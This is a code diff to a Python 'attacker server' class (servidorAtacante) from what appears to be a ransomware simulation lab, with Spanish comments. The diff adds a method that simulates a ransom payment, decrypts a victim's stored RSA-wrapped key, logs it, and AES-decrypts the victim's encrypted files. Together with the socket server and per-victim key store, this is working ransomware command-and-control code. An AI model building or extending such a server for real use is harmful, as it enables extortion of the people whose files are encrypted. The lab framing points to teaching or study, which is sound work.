@@ -1,6 +1,7 @@
 import socket, threading, json, base64, os
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 
 class servidorAtacante:
@@ -130,6 +131,72 @@ class servidorAtacante:
             print("\nServidor detenido manualmente")
         finally:
             server_socket.close()
+
+    def proceso_recuperacion(self, victim_id):
+        """Descifra la clave simétrica y los archivos cifrados para victim_id.
+        Escribe la clave en lab/sample_recovered/attacker_decrypted_keys.txt
+        y los archivos descifrados en lab/sample_recovered/.
+        Devuelve la clave simétrica (base64) si tiene éxito, o None si falla.
+        """
+        if victim_id in self.claves_disponibles:
+            return self.claves_disponibles[victim_id]
+
+        if victim_id not in self.claves_guardadas:
+            return None
+
+        print(f"Atacante: Simulando pago recibido para victima {victim_id}")
+        clave_cifrada = self.claves_guardadas[victim_id]
+        clave_simetrica = self.descifrar_clave_simetrica(clave_cifrada)
+        if not clave_simetrica:
+            return None
+
+        clave_b64 = base64.b64encode(clave_simetrica).decode('utf-8')
+        self.claves_disponibles[victim_id] = clave_b64
+
+        try:
+            os.makedirs('lab/sample_recovered', exist_ok=True)
+            with open('lab/sample_recovered/attacker_decrypted_keys.txt', 'a', encoding='utf-8') as f:
+                f.write(f"{victim_id}: {clave_b64}\n")
+        except Exception as e:
+            print(f"Atacante: Error persistiendo clave liberada: {e}")
+
+        try:
+            cipher_dir = os.path.join('lab', 'sample_cipher')
+            recovered_dir = os.path.join('lab', 'sample_recovered')
+            os.makedirs(recovered_dir, exist_ok=True)
+            files_written = 0
+            for fname in os.listdir(cipher_dir):
+                if fname == 'ransom_note.txt':
+                    continue
+                fullpath = os.path.join(cipher_dir, fname)
+                if not os.path.isfile(fullpath):
+                    continue
+                with open(fullpath, 'rb') as f:
+                    data = f.read()
+                if len(data) < 16:
+                    print(f"Atacante: archivo cifrado demasiado corto: {fname}")
+                    continue
+                iv = data[:16]
+                ciphertext = data[16:]
+                cipher = Cipher(algorithms.AES(clave_simetrica), modes.CBC(iv))
+                decryptor = cipher.decryptor()
+                padded = decryptor.update(ciphertext) + decryptor.finalize()
+                pad_len = padded[-1]
+                if not (1 <= pad_len <= 16):
+                    print(f"Atacante: padding inválido en {fname}")
+                    continue
+                plaintext = padded[:-pad_len]
+                out_name = fname.replace('.enc', '')
+                out_path = os.path.join(recovered_dir, out_name)
+                with open(out_path, 'wb') as out_f:
+                    out_f.write(plaintext)
+                files_written += 1
+            print(f"Atacante: {files_written} archivos descifrados escritos en {recovered_dir}")
+        except Exception as e:
+            print(f"Atacante: Error al descifrar archivos en proceso_recuperacion: {e}")
+
+        print(f"Atacante: Clave simétrica (base64) para {victim_id}: {clave_b64}")
+        return clave_b64
 
 if __name__ == "__main__":
     servidor = servidorAtacante()
